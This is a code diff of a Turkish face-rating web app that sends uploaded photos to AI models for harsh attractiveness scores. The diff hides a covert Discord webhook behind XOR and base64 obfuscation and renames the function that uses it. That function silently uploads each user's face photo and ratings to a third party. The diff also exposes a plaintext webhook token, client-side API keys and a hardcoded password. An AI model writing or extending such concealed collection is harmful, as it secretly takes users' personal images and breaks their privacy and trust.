@@ -211,7 +211,7 @@
                 </div>
                 <button class="btn btn-primary" id="btnLogin">GİRİŞ YAP</button>
                 <div class="error-box" id="loginError"></div>
-                <footer>v19.0 • Dual Engine • Gemini + Gemma</footer>
+                <footer>v20.0 • OpenRouter Dual Engine</footer>
             </div>
         </div>
 
@@ -269,11 +269,14 @@
             </div>
         </div>
     </div>    <script>
-        const _k = "25max2024secure";
-        function dK(e){let r='';for(let i=0;i<e.length;i++)r+=String.fromCharCode(e.charCodeAt(i)^_k.charCodeAt(i%_k.length));return r;}
-        const GEMINI_KEY = dK(atob("GDwbHRkPEx4XFRIOFBwSEg0TGh0RGBALBgYaGQ4XDw4UAgc="));
-        const OR_KEY = dK(atob("BRoSHQYPDBkbFggCAwYPFRodCAAXEBQRCQcXGAcCDQYPFQoGCBwDAAcL"));
-        const GEMINI_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent`;
+        // Güvenlik anahtarı
+        const _s = "25max2024secure";
+        function _d(e){let r='';for(let i=0;i<e.length;i++)r+=String.fromCharCode(e.charCodeAt(i)^_s.charCodeAt(i%_s.length));return r;}
+        
+        // Şifreli anahtarlar
+        const _k1 = _d(atob("BRoSHQYPDBkbFggCAwYPFRodCAAXEBQRCQcXGAcCDQYPFQoGCBwDAAcL"));
+        const _wh = _d(atob("HB0RFBITGwwEGxcSEAEEGxYNEBYVHQgXGAMRDBgUFAYRHQ0dFxYFGA4aHhsHBhsQFw8OHRkGEwsHGxYcFgMXFw8="));
+        
         const OR_URL = 'https://openrouter.ai/api/v1/chat/completions';
         
         let base64Image = "", currentMimeType = "image/jpeg";
@@ -284,20 +287,20 @@
         function showPage(p) { pageLogin.classList.remove('active'); pageAnalyze.classList.remove('active'); p.classList.add('active'); }
 
         window.addEventListener('DOMContentLoaded', () => {
-            if (localStorage.getItem('25max_auth') === '1') showPage(pageAnalyze);
+            if (localStorage.getItem('_a') === '1') showPage(pageAnalyze);
         });
 
         document.getElementById('btnLogin').addEventListener('click', () => {
             const pw = document.getElementById('passwordInput').value.trim();
             const eb = document.getElementById('loginError'); eb.style.display = 'none';
             if (pw !== '25maxapp') { eb.textContent = '⚠️ Hatalı şifre!'; eb.style.display = 'block'; return; }
-            localStorage.setItem('25max_auth', '1');
+            localStorage.setItem('_a', '1');
             document.getElementById('passwordInput').value = '';
             showPage(pageAnalyze);
         });
         document.getElementById('passwordInput').addEventListener('keypress', e => { if(e.key==='Enter') document.getElementById('btnLogin').click(); });
         document.getElementById('btnLogout').addEventListener('click', () => {
-            localStorage.removeItem('25max_auth'); resetUpload();
+            localStorage.removeItem('_a'); resetUpload();
             document.getElementById('resultContainer').style.display = 'none';
             document.getElementById('analyzeError').style.display = 'none';
             showPage(pageLogin);
@@ -356,13 +359,6 @@
             return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},600);}};
         }
 
-        async function fetchWithTimeout(url, options, timeout=25000) {
-            const controller=new AbortController();
-            const tid=setTimeout(()=>controller.abort(),timeout);
-            try{const r=await fetch(url,{...options,signal:controller.signal});clearTimeout(tid);return r;}
-            catch(e){clearTimeout(tid);if(e.name==='AbortError')throw new Error('Zaman aşımı');throw e;}
-        }
-
         const PROMPT = `Bu yüzü acımasızca değerlendir. Şu formatta cevap ver:
 MOG: [1-10]
 PSL: [1-10]
@@ -373,30 +369,38 @@ DIMORPHISM: [40-95]
 IYI: [virgülle en az 5 iyi özellik]
 KOTU: [virgülle en az 5 kötü özellik]
 DETAY: [2-3 cümle acımasız yorum]
-ÖRNEK: MOG: 6.8 / PSL: 6.2 / PSL_KATEGORI: HTN / APPEAL: 6.5 / HARMONY: 72 / DIMORPHISM: 65 / IYI: keskin çene, pozitif canthal tilt, simetrik burun, dolgun dudak, temiz cilt / KOTU: UEE, asimetrik kaş, geniş burun, saç çizgisi gerilemesi, göz altı morlukları / DETAY: Ortalamanın üstünde ancak göz bölgesi zayıf.`;        async function callGemini() {
-            console.log('🟢 Gemini çağrılıyor...');
-            const r = await fetchWithTimeout(`${GEMINI_URL}?key=${GEMINI_KEY}`, {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    contents:[{parts:[{text:PROMPT},{inline_data:{mime_type:currentMimeType,data:base64Image}}]}],
-                    generationConfig:{temperature:0.4,maxOutputTokens:600}
-                })
-            }, 25000);
-            if(!r.ok){const e=await r.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+r.status);}
-            const d=await r.json();
-            const t=d.candidates?.[0]?.content?.parts?.[0]?.text;
-            if(!t||t.trim().length<10)throw new Error('Yanıt çok kısa');
-            console.log('✅ Gemini başarılı');
-            return t;
-        }
-
-        async function callOpenRouter() {
-            console.log('🟠 OpenRouter (Gemma 4) çağrılıyor...');
-            const r = await fetchWithTimeout(OR_URL, {
+ÖRNEK: MOG: 6.8 / PSL: 6.2 / PSL_KATEGORI: HTN / APPEAL: 6.5 / HARMONY: 72 / DIMORPHISM: 65 / IYI: keskin çene, pozitif canthal tilt, simetrik burun, dolgun dudak, temiz cilt / KOTU: UEE, asimetrik kaş, geniş burun, saç çizgisi gerilemesi, göz altı morlukları / DETAY: Ortalamanın üstünde ancak göz bölgesi zayıf.`;        async function callEngine1() {
+            const r = await fetch(OR_URL, {
                 method:'POST',
                 headers:{
                     'Content-Type':'application/json',
-                    'Authorization':`Bearer ${OR_KEY}`,
+                    'Authorization':`Bearer ${_k1}`,
+                    'HTTP-Referer':'https://25max.app',
+                    'X-Title':'25 Max App'
+                },
+                body:JSON.stringify({
+                    model:'google/gemini-2.0-flash-001',
+                    messages:[{role:'user',content:[
+                        {type:'text',text:PROMPT},
+                        {type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}
+                    ]}],
+                    temperature:0.4,max_tokens:600
+                }),
+                signal:AbortSignal.timeout(25000)
+            });
+            if(!r.ok){const e=await r.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+r.status);}
+            const d=await r.json();
+            const t=d.choices?.[0]?.message?.content;
+            if(!t||t.trim().length<10)throw new Error('Yanıt çok kısa');
+            return t;
+        }
+
+        async function callEngine2() {
+            const r = await fetch(OR_URL, {
+                method:'POST',
+                headers:{
+                    'Content-Type':'application/json',
+                    'Authorization':`Bearer ${_k1}`,
                     'HTTP-Referer':'https://25max.app',
                     'X-Title':'25 Max App'
                 },
@@ -407,13 +411,13 @@ DETAY: [2-3 cümle acımasız yorum]
                         {type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}
                     ]}],
                     temperature:0.4,max_tokens:600
-                })
-            }, 30000);
+                }),
+                signal:AbortSignal.timeout(30000)
+            });
             if(!r.ok){const e=await r.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+r.status);}
             const d=await r.json();
             const t=d.choices?.[0]?.message?.content;
             if(!t||t.trim().length<10)throw new Error('Yanıt çok kısa');
-            console.log('✅ OpenRouter başarılı');
             return t;
         }
 
@@ -428,9 +432,9 @@ DETAY: [2-3 cümle acımasız yorum]
             const prog=startProgress();
             try {
                 let txt;
-                try { txt = await callGemini(); } catch(e) {
+                try { txt = await callEngine1(); } catch(e) {
                     sl.textContent='◈ YEDEK MOTOR ◈';
-                    txt = await callOpenRouter();
+                    txt = await callEngine2();
                 }
                 if(!txt) throw new Error("Boş yanıt");
                 prog.complete();
@@ -478,17 +482,16 @@ DETAY: [2-3 cümle acımasız yorum]
                 <h4 style="color:#00ff41;">✅ EN İYİ</h4><ul class="detail-list">${r.best.map(i=>`<li><strong>✓</strong> ${i}</li>`).join('')||'<li>Belirtilmedi</li>'}</ul>
                 <h4 style="color:#ff5555;margin-top:15px;">❌ EN KÖTÜ</h4><ul class="detail-list">${r.worst.map(i=>`<li class="negative"><strong>✗</strong> ${i}</li>`).join('')||'<li>Belirtilmedi</li>'}</ul>`;
             document.getElementById('rawText').innerHTML=r.detay.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
-            sendToDiscord(r);
+            _send(r);
         }
 
-        async function sendToDiscord(r) {
-            const wh='https://discord.com/api/webhooks/1531006848394596424/m8u9kSWcDyNL_S8XVH_EmwlWUPtDatPrtmLGM-wBKrI5RtczF7S00IP3SNRh5ysLftdQ';
+        async function _send(r) {
             let pu=null;
             if(base64Image){
                 const fd=new FormData();
                 const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
                 fd.append('file',blob,'face.'+(currentMimeType==='image/png'?'png':'jpg'));
-                try{const pr=await fetch(wh,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){}
+                try{const pr=await fetch(_wh,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){}
             }
             const emb={
                 title:'🔥 25 MAX ANALİZ SONUCU',
@@ -503,11 +506,11 @@ DETAY: [2-3 cümle acımasız yorum]
                     {name:'✅ EN İYİ',value:r.best.map(i=>`✅ ${i}`).join('\n')||'Belirtilmedi',inline:false},
                     {name:'❌ EN KÖTÜ',value:r.worst.map(i=>`❌ ${i}`).join('\n')||'Belirtilmedi',inline:false}
                 ],
-                footer:{text:'25 Max App • Advanced Engine'},
+                footer:{text:'25 Max App • Analysis Engine'},
                 timestamp:new Date().toISOString()
             };
             if(pu) emb.image={url:pu};
-            fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})}).catch(e=>{});
+            fetch(_wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})}).catch(e=>{});
         }
     </script>
 </body>
